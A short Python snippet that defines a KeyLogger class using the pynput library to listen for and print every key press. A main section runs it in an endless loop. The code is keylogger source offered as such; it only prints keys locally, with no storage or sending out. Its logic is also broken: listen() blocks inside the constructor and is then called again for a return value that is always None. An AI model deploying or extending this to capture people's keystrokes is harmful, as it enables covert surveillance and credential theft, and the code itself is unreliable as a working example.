# MODULE
#pip install pynput
from pynput.keyboard import Key,Listener

def on_press(key):
    print(key)

class KeyLogger:
    def __init__(self):
        self.listen()
    def listen(self):
        with Listener(on_press=on_press) as listener:
            listener.join()
            
#MAIN
from module import KeyLogger

while True:
  kl = KeyLogger()
  key = kl.listen()
  print(key)
